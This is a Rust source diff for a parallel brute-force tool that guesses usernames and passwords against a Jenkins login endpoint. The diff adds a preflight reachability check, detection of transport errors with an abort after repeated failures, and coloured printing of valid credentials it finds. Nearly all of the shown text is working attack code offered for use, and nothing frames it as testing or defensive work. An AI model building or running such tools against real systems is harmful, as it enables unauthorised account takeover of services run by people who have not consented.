@@ -4,7 +4,7 @@ use rayon::prelude::*;
 use rayon::ThreadPoolBuilder;
 use std::collections::HashSet;
 use std::fs::File;
-use std::io::{BufRead, BufReader, Write};
+use std::io::{BufRead, BufReader, IsTerminal, Write};
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
@@ -70,7 +70,7 @@ fn target_login(
     login_path: &str,
     username: &str,
     password: &str,
-) -> Result<bool> {
+) -> std::result::Result<bool, reqwest::Error> {
     let path = login_path.trim().trim_matches('/');
     let url = format!("{}/{}", base_url.trim_end_matches('/'), path);
 
@@ -90,6 +90,43 @@ fn target_login(
             Ok(loc_str.trim_end_matches('/').is_empty() || loc_str.ends_with("/"))
         }
         None => Ok(false),
+    }
+}
+
+/// One POST to the login endpoint before brute-force. Fails fast if the host is down or unreachable.
+fn preflight_login(client: &Client, base_url: &str, login_path: &str) -> Result<()> {
+    match target_login(client, base_url, login_path, "_", "_") {
+        Ok(_) => Ok(()),
+        Err(e) => {
+            let path = login_path.trim().trim_matches('/');
+            bail!(
+                "cannot reach the target (login POST failed before brute-force).\n\
+                 \n\
+                 Tried: {}/{}  (base URL + --endpoint)\n\
+                 Error: {e}\n\
+                 \n\
+                 Check: network/VPN, DNS, firewall, --url, --endpoint, and that Jenkins is running.",
+                base_url.trim_end_matches('/'),
+                path
+            );
+        }
+    }
+}
+
+/// True when `send()` failed at the transport layer (TCP/TLS/DNS/timeout), not an HTTP response.
+fn is_transport_failure(e: &reqwest::Error) -> bool {
+    e.is_connect() || e.is_timeout()
+}
+
+fn print_valid_credentials(user: &str, pass: &str) {
+    let color = std::io::stdout().is_terminal() && std::env::var_os("NO_COLOR").is_none();
+    if color {
+        println!(
+            "\x1b[32m[+] VALID CREDENTIALS: {} / {}\x1b[0m",
+            user, pass
+        );
+    } else {
+        println!("[+] VALID CREDENTIALS: {} / {}", user, pass);
     }
 }
 
@@ -280,6 +317,9 @@ fn run() -> Result<()> {
         url
     );
     println!("[*] Login endpoint: /{}", endpoint);
+    println!("[*] Probing target (single request)…");
+    preflight_login(&client, url, &endpoint)?;
+    println!("[*] Host responded over HTTP; starting brute-force.");
     println!(
         "[*] Trying {} users × {} passwords",
         users.len(),
@@ -293,9 +333,15 @@ fn run() -> Result<()> {
     let mut found = false;
     let stop = Arc::new(AtomicBool::new(false));
     let passwords = Arc::new(passwords);
+    let got_http_response = Arc::new(AtomicBool::new(false));
+    let transport_failures = Arc::new(AtomicUsize::new(0));
+    let abort_unreachable = Arc::new(AtomicBool::new(false));
 
     for user in &users {
         if found {
+            break;
+        }
+        if abort_unreachable.load(Ordering::Relaxed) {
             break;
         }
 
@@ -303,6 +349,9 @@ fn run() -> Result<()> {
         let endpoint = endpoint.clone();
         let passwords = Arc::clone(&passwords);
         let progress = Arc::clone(&progress);
+        let got_http_response = Arc::clone(&got_http_response);
+        let transport_failures = Arc::clone(&transport_failures);
+        let abort_unreachable = Arc::clone(&abort_unreachable);
 
         let hit = pool.install(|| {
             passwords.par_iter().find_any(|pass| {
@@ -312,12 +361,36 @@ fn run() -> Result<()> {
                 progress.bump();
                 match target_login(&client, url, &endpoint, &user, pass.as_str()) {
                     Ok(true) => {
+                        got_http_response.store(true, Ordering::Relaxed);
                         stop.store(true, Ordering::Relaxed);
                         progress.finish_line();
-                        println!("[+] VALID CREDENTIALS: {} / {}", user, pass);
+                        print_valid_credentials(&user, pass);
                         true
                     }
-                    Ok(false) | Err(_) => false,
+                    Ok(false) => {
+                        got_http_response.store(true, Ordering::Relaxed);
+                        false
+                    }
+                    Err(e) => {
+                        if got_http_response.load(Ordering::Relaxed) {
+                            return false;
+                        }
+                        if !is_transport_failure(&e) {
+                            return false;
+                        }
+                        let n = transport_failures.fetch_add(1, Ordering::Relaxed) + 1;
+                        if n == 1 {
+                            eprintln!(
+                                "\n[!] Connection error while contacting the server: {e}\n\
+                                 (Aborting after repeated failures if the host never responds.)"
+                            );
+                        }
+                        if n >= 5 {
+                            abort_unreachable.store(true, Ordering::Relaxed);
+                            stop.store(true, Ordering::Relaxed);
+                        }
+                        false
+                    }
                 }
             })
         });
@@ -326,9 +399,17 @@ fn run() -> Result<()> {
             found = true;
             break;
         }
+        if abort_unreachable.load(Ordering::Relaxed) {
+            progress.finish_line();
+            eprintln!(
+                "[!] Aborted: target became unreachable (no successful HTTP response after {} attempts).",
+                transport_failures.load(Ordering::Relaxed)
+            );
+            return Ok(());
+        }
     }
 
-    if !found {
+    if !found && !abort_unreachable.load(Ordering::Relaxed) {
         progress.finish_line();
         println!("[!] No valid credentials found.");
     }
